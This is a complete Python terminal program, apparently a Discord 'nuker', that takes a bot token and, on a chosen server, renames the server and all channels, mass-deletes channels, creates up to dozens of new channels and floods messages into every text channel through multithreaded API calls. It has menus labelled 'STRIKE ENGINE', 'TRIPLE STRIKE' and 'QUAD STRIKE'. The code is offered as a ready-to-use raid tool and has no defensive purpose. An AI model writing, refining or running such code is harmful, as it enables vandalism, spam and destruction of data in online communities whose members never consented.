import requests
import threading
import time
import sys
import os
from datetime import datetime

# =======================================================
# CONFIGURATION: PASTE YOUR BOT TOKEN HERE
# =======================================================
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
# =======================================================

class TerminalDiscordLauncher:
    def __init__(self):
        # Color mapping for terminal styling
        self.colors = {
            "bg": "\033[48;5;232m",       # #0f0f0f Background color
            "sidebar": "\033[48;5;233m",  # #121212
            "accent": "\033[38;5;63m",    # #5865F2 Discord Accent Blue
            "danger": "\033[38;5;196m",   # #ED4245 Red
            "warning": "\033[38;5;220m",  # #FEE75C Yellow
            "success": "\033[38;5;84m",   # #57F287 Green
            "text": "\033[38;5;252m",      # #E3E5E8 Text color
            "gray": "\033[38;5;244m",      # Gray
            "reset": "\033[0m"
        }
        
        self.guilds_data = []
        self.channels_data = []
        self.stop_event = threading.Event()
        
        # Token is automatically loaded from the configuration section above
        self.token_value = BOT_TOKEN
        self.selected_guild_index = -1
        
        # System Sync Status
        self.sync_status_text = "● SYNC OFF"
        self.sync_status_color = self.colors["gray"]

        # 1. Fetch server list immediately on startup to prevent target errors
        self.initial_fetch()

        # 2. Start background thread for continuous API updates
        threading.Thread(target=self.auto_refresh_loop, daemon=True).start()
        
        # Launch straight into the main menu
        self.main_loop()

    def clear_screen(self):
        """Clears the terminal screen completely"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def initial_fetch(self):
        """Fetches the server list directly at startup so data is instantly available"""
        token = self.token_value.strip()
        if token and token != "YOUR_DISCORD_BOT_TOKEN_HERE":
            self.clear_screen()
            print(f"{self.colors['accent']}[*] Connecting to Discord API... Please wait.{self.colors['reset']}")
            for _ in range(3):  # Retry up to 3 times directly during boot
                try:
                    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=self.get_headers(), timeout=5)
                    if r.status_code == 200:
                        self.guilds_data = r.json()
                        self.sync_status_text = "● SYSTEM ONLINE"
                        self.sync_status_color = self.colors["success"]
                        break
                except:
                    pass
                time.sleep(1)

    def print_header(self, page_title):
        self.clear_screen()  # Always clear terminal right before drawing a new view
        print(f"{self.colors['sidebar']}==============================================={self.colors['reset']}")
        print(f"{self.colors['accent']}   CORE | SLIM INTERFACE (TERMINAL PORT)       {self.colors['reset']}")
        print(f"   Status: {self.sync_status_color}{self.sync_status_text}{self.colors['reset']}")
        print(f"   Token Set: {'✓ Yes' if self.token_value and self.token_value != 'YOUR_DISCORD_BOT_TOKEN_HERE' else '✗ No'}")
        if self.selected_guild_index != -1 and self.guilds_data:
            print(f"   Target Grid: {self.colors['text']}{self.guilds_data[self.selected_guild_index]['name']}{self.colors['reset']}")
        else:
            print(f"   Target Grid: {self.colors['gray']}None Selected{self.colors['reset']}")
        print(f"{self.colors['sidebar']}==============================================={self.colors['reset']}")
        print(f"--- {page_title} ---")

    def main_loop(self):
        while True:
            self.print_header("MAIN MENU")
            print("1. Update / View Access Token")
            print("2. Select Target Guild (Server Dropdown)")
            print("3. Open UTILITIES Page")
            print("4. Open STRIKE ENGINE Page")
            print(f"5. {self.colors['danger']}STOP ALL OPERATIONS{self.colors['reset']}")
            print("0. Exit Application")
            
            choice = input("\nChoose an option: ").strip()
            
            if choice == "1":
                print(f"Current Token: {self.token_value if self.token_value else 'None'}")
                new_token = input("Enter new Access Token (Press Enter to keep current): ").strip()
                if new_token:
                    self.token_value = new_token
                    print("[!] Token updated in local data space.")
                    self.initial_fetch()
            elif choice == "2":
                self.interactive_select_guild()
            elif choice == "3":
                # Auto-select if user forgot
                if self.selected_guild_index == -1:
                    print(f"{self.colors['warning']}[!] No Target Grid selected! Please choose a server first:{self.colors['reset']}")
                    self.interactive_select_guild()
                if self.selected_guild_index != -1:
                    self.show_standard_page()
            elif choice == "4":
                # Auto-select if user forgot
                if self.selected_guild_index == -1:
                    print(f"{self.colors['warning']}[!] No Target Grid selected! Please choose a server first:{self.colors['reset']}")
                    self.interactive_select_guild()
                if self.selected_guild_index != -1:
                    self.show_strike_page()
            elif choice == "5":
                self.stop_all()
                time.sleep(1.5)
            elif choice == "0":
                self.clear_screen()
                print("Exiting...")
                sys.exit(0)
            else:
                print(f"{self.colors['danger']}Invalid Selection.{self.colors['reset']}")
                time.sleep(1)

    def interactive_select_guild(self):
        if not self.guilds_data:
            print(f"{self.colors['warning']}[!] No guild data loaded. Verify your token or wait a moment.{self.colors['reset']}")
            input("\nPress Enter to return...")
            return
        
        print("\n--- SELECT TARGET GRID ---")
        for idx, g in enumerate(self.guilds_data):
            print(f"[{idx}] {g['name']} (ID: {g['id']})")
            
        try:
            choice = int(input("Select index: "))
            if 0 <= choice < len(self.guilds_data):
                self.selected_guild_index = choice
                self.load_channels()  # Fetch channels immediately and synchronously
            else:
                print("Out of range selection.")
                time.sleep(1)
        except ValueError:
            print("Invalid index choice.")
            time.sleep(1)

    def show_standard_page(self):
        self.print_header("UTILITIES")
        print("Actions:")
        print("1. Send Message")
        print("2. Delete Channels")
        print("3. Channel Spam")
        action_idx = input("Select action index: ").strip()
        
        action_map = {"1": "Send Message", "2": "Delete Channels", "3": "Channel Spam"}
        action = action_map.get(action_idx, "Send Message")

        entry_input = input("INPUT STRING: ")
        entry_count = input("COUNT (Default 1): ")

        print(f"\n[{self.colors['accent']}* {self.colors['reset']}] 1. EXECUTE COMMAND")
        print(f"[{self.colors['gray']}* {self.colors['reset']}] 0. Back to main menu")
        
        exe = input(">> ").strip()
        if exe == "1":
            if self.selected_guild_index == -1:
                print(f"{self.colors['danger']}[X] Error: No Target Grid selected!{self.colors['reset']}")
                time.sleep(1.5)
                return
            self.stop_event.clear()
            g_id = self.guilds_data[self.selected_guild_index]['id']
            threading.Thread(target=self.run_standard_task, args=(action, g_id, entry_input, entry_count), daemon=True).start()
            print(f"{self.colors['success']}[✓] Task worker dispatched to background.{self.colors['reset']}")
            input("\nPress Enter to go back...")

    def show_strike_page(self):
        self.print_header("STRIKE ENGINE")
        
        global_identifier = input("GLOBAL IDENTIFIER (AUTO-FILL ALL) [Leave blank to skip]: ").strip()
        if global_identifier:
            s_name = c_name = m_content = global_identifier
            print(f"-> Auto-filled with: {global_identifier}")
        else:
            s_name = input("NEW SERVER NAME: ")
            c_name = input("CHANNEL NAMES: ")
            m_content = input("SPAM MESSAGE: ")

        strike_msg_count = input("MSG PER CHAN (Default 5): ")
        strike_chan_count = input("NEW CHANNELS (Default 10): ")

        print(f"\n1. {self.colors['warning']}DEPLOY TRIPLE STRIKE{self.colors['reset']}")
        print(f"2. {self.colors['danger']}INITIATE QUAD STRIKE{self.colors['reset']}")
        print("0. Return to menu")
        
        strike_choice = input(">> ").strip()
        if strike_choice in ["1", "2"]:
            if self.selected_guild_index == -1:
                print(f"{self.colors['danger']}[X] Error: No Target Grid selected! Please select option 2 in the main menu first.{self.colors['reset']}")
                time.sleep(2)
                return
            mode = "triple" if strike_choice == "1" else "quad"
            self.stop_event.clear()
            
            g_id = self.guilds_data[self.selected_guild_index]['id']
            threading.Thread(target=self.execute_strike_task, args=(mode, g_id, s_name, c_name, m_content, strike_msg_count, strike_chan_count), daemon=True).start()
            print(f"{self.colors['success']}[✓] Strike thread deployed asynchronously.{self.colors['reset']}")
            input("\nPress Enter to monitor execution in main menu...")

    def get_headers(self):
        return {"Authorization": f"Bot {self.token_value.strip()}", "Content-Type": "application/json"}

    def auto_refresh_loop(self):
        while True:
            token = self.token_value.strip()
            if token and token != "YOUR_DISCORD_BOT_TOKEN_HERE":
                try:
                    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=self.get_headers(), timeout=5)
                    if r.status_code == 200:
                        self.guilds_data = r.json()
                    if self.selected_guild_index != -1 and self.guilds_data:
                        g_id = self.guilds_data[self.selected_guild_index]['id']
                        r = requests.get(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=self.get_headers(), timeout=5)
                        if r.status_code == 200: 
                            self.channels_data = r.json()
                    self.sync_status_text = "● SYSTEM ONLINE"
                    self.sync_status_color = self.colors["success"]
                except:
                    self.sync_status_text = "● CONNECTION ERROR"
                    self.sync_status_color = self.colors["danger"]
            time.sleep(5)

    def load_channels(self):
        """Fetches channels for the selected server instantly"""
        if self.selected_guild_index != -1 and self.guilds_data:
            server_name = self.guilds_data[self.selected_guild_index]['name']
            g_id = self.guilds_data[self.selected_guild_index]['id']
            print(f"\n[LOG] Locking onto: {server_name}...")
            try:
                r = requests.get(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=self.get_headers(), timeout=5)
                if r.status_code == 200:
                    self.channels_data = r.json()
                    print(f"{self.colors['success']}[✓] Target Grid successfully locked: {server_name}{self.colors['reset']}\n")
                    time.sleep(1.5)
                else:
                    print(f"{self.colors['danger']}[X] Failed to fetch channels: Status {r.status_code}{self.colors['reset']}\n")
                    time.sleep(1.5)
            except Exception as e:
                print(f"{self.colors['danger']}[X] Error connecting to server grid API: {e}{self.colors['reset']}\n")
                time.sleep(1.5)

    def run_standard_task(self, action, g_id, entry_input, entry_count):
        headers = self.get_headers()
        content = entry_input
        try: 
            count = int(entry_count)
        except: 
            count = 1
        
        if action == "Send Message" or action == "Channel Spam":
            for c in self.channels_data:
                if self.stop_event.is_set(): 
                    break
                if c['type'] in [0, 5]: 
                    threading.Thread(target=self._msg_worker, args=(c['id'], headers, content, count)).start()
        elif action == "Delete Channels":
            for c in self.channels_data:
                if self.stop_event.is_set(): 
                    break
                requests.delete(f"https://discord.com/api/v10/channels/{c['id']}", headers=headers)

    def execute_strike_task(self, mode, g_id, s_name, c_name, m_content, msg_c, chan_c):
        headers = self.get_headers()
        try: 
            msg_count = int(msg_c)
            chan_count = int(chan_c)
        except: 
            msg_count, chan_count = 5, 10
        
        print(f"\n{self.colors['danger']}[!] START {mode.upper()}{self.colors['reset']}\n")
        
        # 1. RENAME SERVER
        if not self.stop_event.is_set():
            r = requests.patch(f"https://discord.com/api/v10/guilds/{g_id}", headers=headers, json={"name": s_name})
            if r.status_code == 200:
                print(f"[✓] SERVER NAME -> {s_name}\n")
            else:
                print(f"[X] SERVER RENAME FAILED: {r.status_code}\n")

        # 2. RENAME CHANNELS & SPAM MESSAGES
        for c in list(self.channels_data):
            if self.stop_event.is_set(): 
                break
            threading.Thread(target=self._rename_worker, args=(c['id'], headers, c_name)).start()
            if c['type'] in [0, 5]: 
                threading.Thread(target=self._msg_worker, args=(c['id'], headers, m_content, msg_count)).start()
            time.sleep(0.04)
        
        # 3. CREATE CHANNELS & SPAM (QUAD STRIKE)
        if mode == "quad":
            for i in range(chan_count):
                if self.stop_event.is_set(): 
                    break
                threading.Thread(target=self._create_and_spam, args=(g_id, headers, c_name, m_content, msg_count)).start()
                time.sleep(0.1)

    def _create_and_spam(self, g_id, headers, c_name, m_content, msg_count):
        if self.stop_event.is_set(): 
            return
        r = requests.post(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=headers, json={"name": c_name.lower().replace(" ", "-")})
        if r.status_code == 201: 
            self._msg_worker(r.json()['id'], headers, m_content, msg_count)

    def _rename_worker(self, c_id, headers, name):
        if self.stop_event.is_set(): 
            return
        requests.patch(f"https://discord.com/api/v10/channels/{c_id}", headers=headers, json={"name": name.lower().replace(" ", "-")})

    def _msg_worker(self, c_id, headers, content, count):
        for i in range(count):
            if self.stop_event.is_set(): 
                break
            requests.post(f"https://discord.com/api/v10/channels/{c_id}/messages", headers=headers, json={"content": content})
            time.sleep(0.3)
        print(f"[#] {c_id} OK\n")

    def stop_all(self):
        """Triggers the event to immediately abort all background threads"""
        self.stop_event.set()
        print(f"\n{self.colors['danger']}[!!!] STOP SIGNAL SENT{self.colors['reset']}\n")
        
        def reset():
            time.sleep(2)
            self.stop_event.clear()
            print(f"\n{self.colors['success']}[!] SYSTEM RESET: READY{self.colors['reset']}\n")
            
        threading.Thread(target=reset, daemon=True).start()

if __name__ == "__main__":
    app = TerminalDiscordLauncher()
